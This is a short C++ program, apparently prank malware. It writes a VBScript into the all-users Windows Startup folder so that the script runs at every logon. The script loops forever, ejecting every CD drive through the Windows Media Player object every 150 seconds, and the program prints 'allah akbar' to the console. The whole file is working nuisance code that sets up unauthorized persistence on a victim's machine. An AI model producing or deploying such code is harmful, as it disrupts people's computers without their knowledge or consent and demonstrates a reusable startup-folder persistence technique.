#include <iostream>
#include <fstream>

using namespace std;

int main()
{
	fstream script;
	ofstream outfile("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script.vbs");
	script.open("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script.vbs", ios::in | ios::out);

	script << "do \nDim ts \nDim strDriveLetter \nDim intDriveLetter \nDim fs 'As Scripting.FileSystemObject \nConst CDROM = 4 \nOn Error Resume Next \nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nstrDriveLetter = \"\"\nFor intDriveLetter = Asc(\"A\") To Asc(\"Z\")\nErr.Clear\nIf fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then\nIf Err.Number = 0 Then\nstrDriveLetter = Chr(intDriveLetter)\nExit For\nEnd If\nEnd If\nNext\nSet oWMP = CreateObject(\"WMPlayer.OCX.7\" )\nSet colCDROMs = oWMP.cdromCollection\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nset owmp = nothing\nset colCDROMs = nothing\nWScript.Sleep " << endl;
	script << "150000"; // 600 000 - 10 min
	script << "\nloop\n" << endl;
	
	cout << "allah akbar" << endl;

	script.close();
	cin.get();
	cin.get();
}
